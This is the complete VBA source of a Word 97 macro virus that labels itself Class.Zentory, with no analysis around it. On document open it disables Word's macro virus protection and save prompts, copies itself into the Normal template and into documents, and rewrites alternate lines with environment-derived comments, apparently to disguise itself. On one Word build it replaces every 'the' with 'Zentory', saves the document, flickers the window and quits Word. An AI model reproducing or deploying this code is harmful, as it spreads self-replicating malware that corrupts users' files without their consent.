   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   Sub AutoOpen()

   On Error GoTo 69

   Options.VirusProtection = False

   Options.SaveNormalPrompt = False

   Options.ConfirmConversions = False

   xz = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines

   zx = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines

   If zx > 120 And xz > 0 Then GoTo 69

   If zx < 120 Then

       Set xsz = NormalTemplate.VBProject.VBComponents.Item(1)

       ActiveDocument.VBProject.VBComponents.Item(1).Name = xsz.Name

       ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\zentory$.ffo"

   End If

   If xz = 0 Then Set xsz = ActiveDocument.VBProject.VBComponents.Item(1)

   Infection = Int(Rnd * 100)

   If Infection = 99 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(90) + Chr(69) + Chr(78) + Chr(84) + Chr(79) + Chr(82) + Chr(89) + Chr(32) + Chr(66) + Chr(121) + Chr(32) + Chr(86) + Chr(105) + Chr(82) + Chr(117) + Chr(83)

   If Application.Build = "8.0.4412" Then Call z2000

   xsz.codemodule.AddFromFile ("c:\zentory$.ffo")

   With xsz.codemodule

       For x = 1 To 4

       .deletelines 1

       Next x

   End With

   If zx < 120 Then

       With xsz.codemodule

       .replaceline 1, "Sub AutoClose()"

       .replaceline 123, "Sub ToolsMacro()"

       End With

   End If

   With xsz.codemodule

       For x = 2 To 122 Step 2

       .replaceline x, "'" & Application.Build & Application.StartupPath & Application.WindowState & Application.FocusInMailHeader & Application.ActiveWindow

   Next x

   End With

   69:

   If zx > 120 And xz = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName

   End Sub

   Private Sub z2000()

   On Error Resume Next

           Selection.HomeKey Unit:=wdStory

           Selection.Find.ClearFormatting

           Selection.Find.Replacement.ClearFormatting

           With Selection.Find

               .Text = "the"

               .Replacement.Text = "Zentory"

               .Forward = True

               .Wrap = wdFindContinue

               .Format = False

               .MatchCase = False

               .MatchWholeWord = True

               .MatchAllWordForms = False

           End With

           Selection.Find.Execute Replace:=wdReplaceAll

   If ActiveDocument.Saved = False Then ActiveDocument.Save

   Rpx:

   I = I + 1

   Application.WindowState = wdWindowStateMinimize

   Application.WindowState = wdWindowStateMaximize

   If I < 10 Then GoTo Rpx

   Application.Quit

   End Sub

   Sub ViewVBCode()
   'Word97/Class.Zentory by Virus,Hi Vic.
   End Sub
